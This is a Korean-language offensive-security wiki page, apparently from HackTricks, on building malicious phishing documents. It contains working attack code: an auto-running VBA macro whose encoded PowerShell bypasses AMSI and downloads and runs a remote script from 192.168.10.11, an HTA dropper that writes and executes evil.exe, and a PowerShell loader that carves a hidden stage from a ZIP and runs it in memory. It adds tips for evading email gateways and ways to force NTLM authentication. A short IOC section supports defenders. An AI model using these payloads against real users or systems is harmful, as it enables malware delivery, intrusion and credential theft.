# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word는 파일을 열기 전에 파일 데이터 검증을 수행합니다. 데이터 검증은 OfficeOpenXML 표준에 따라 데이터 구조 식별의 형태로 수행됩니다. 데이터 구조 식별 중 오류가 발생하면 분석 중인 파일은 열리지 않습니다.

보통 매크로가 포함된 Word 파일은 `.docm` 확장자를 사용합니다. 하지만 파일 확장자를 변경해 이름을 바꾸더라도 매크로 실행 기능을 유지하는 것이 가능합니다.\
예를 들어, RTF 파일은 설계상 매크로를 지원하지 않지만, DOCM 파일을 RTF로 이름을 바꾸면 Microsoft Word에서 해당 파일을 처리하여 매크로를 실행할 수 있게 됩니다.\
동일한 내부 구조와 메커니즘이 Microsoft Office Suite (Excel, PowerPoint etc.)의 모든 소프트웨어에 적용됩니다.

다음 명령어를 사용하여 일부 Office 프로그램에서 실행될 확장자를 확인할 수 있습니다:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX 파일이 macros를 포함한 원격 템플릿 (File –Options –Add-ins –Manage: Templates –Go)을 참조하면 macros를 “실행”할 수도 있다.

### 외부 이미지 로드

다음으로 이동: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros 백도어

문서에서 macros를 사용하여 arbitrary code를 실행할 수 있다.

#### Autoload functions

더 흔할수록 AV가 탐지할 가능성이 높다.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 메타데이터 수동 제거

**File > Info > Inspect Document > Inspect Document**로 이동하면 Document Inspector가 나타납니다. **Inspect**를 클릭한 다음 **Document Properties and Personal Information** 옆의 **Remove All**을 클릭하세요.

#### Doc 확장자

작업이 끝나면 **Save as type** 드롭다운에서 형식을 **`.docx`**에서 **Word 97-2003 `.doc`**로 변경하세요.\
이는 **`.docx`** 내부에 macro's를 저장할 수 없고 macro-enabled **`.docm`** 확장자에 대한 오명(예: 썸네일 아이콘에 큰 `!`가 표시되고 일부 웹/이메일 게이트웨이가 이를 완전히 차단함)이 있기 때문입니다. 따라서 이 **레거시 `.doc` 확장자가 최선의 타협안입니다**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

HTA는 HTML과 스크립팅 언어(예: VBScript 및 JScript)를 결합한 Windows 프로그램입니다. 사용자 인터페이스를 생성하고 브라우저의 보안 모델 제약 없이 "fully trusted" 애플리케이션으로 실행됩니다.

HTA는 **`mshta.exe`**를 사용해 실행되며, 일반적으로 **Internet Explorer**와 함께 설치되어 **`mshta`가 IE에 의존하게** 됩니다. 따라서 IE가 제거된 경우 HTA는 실행할 수 없습니다.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcing NTLM Authentication

여러 가지 방법으로 **NTLM authentication을 "원격으로" 강제**할 수 있습니다. 예를 들어, 사용자가 접근할 이메일이나 HTML에 **보이지 않는 이미지**를 추가하거나(심지어 HTTP MitM?), 피해자에게 폴더를 **열기만 해도** **인증을 유발하는** **파일 주소**를 보낼 수 있습니다.

**다음 페이지에서 이러한 아이디어들과 더 많은 내용을 확인하세요:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

hash나 인증을 훔치는 것뿐만 아니라 **NTLM relay 공격을 수행**할 수도 있다는 점을 잊지 마세요:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

효과적인 캠페인은 두 개의 정상적인 미끼 문서(PDF/DOCX)와 악성 .lnk를 포함한 ZIP을 배포합니다. 핵심은 실제 PowerShell loader가 고유한 마커 뒤의 ZIP 원시 바이트에 저장되어 있고, .lnk가 이를 carving해서 완전히 메모리에서 실행한다는 점입니다.

Typical flow implemented by the .lnk PowerShell one-liner:

1) Desktop, Downloads, Documents, %TEMP%, %ProgramData% 및 현재 작업 디렉터리의 부모 등 일반 경로에서 원본 ZIP을 찾습니다.
2) ZIP 바이트를 읽어 하드코딩된 마커(예: xFIQCV)를 찾습니다. 마커 이후의 모든 것이 임베디드된 PowerShell 페이로드입니다.
3) ZIP을 %ProgramData%로 복사하고 그곳에서 압축을 풀며, 정상처럼 보이도록 미끼 .docx를 엽니다.
4) 현재 프로세스에 대해 AMSI를 우회: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 다음 단계의 난독화를 해제(예: 모든 # 문자 제거)하고 메모리에서 실행합니다.

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
- The next stage frequently decrypts base64/XOR shellcode and executes it via Reflection.Emit + VirtualAlloc to minimize disk artifacts.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files containing the ASCII marker string (e.g., xFIQCV) appended to the archive data.
- .lnk that enumerates parent/user folders to locate the ZIP and opens a decoy document.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads ending with links hosted under trusted PaaS domains.

## Windows files to steal NTLM hashes

다음 페이지에서 **places to steal NTLM creds**를 확인하세요:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
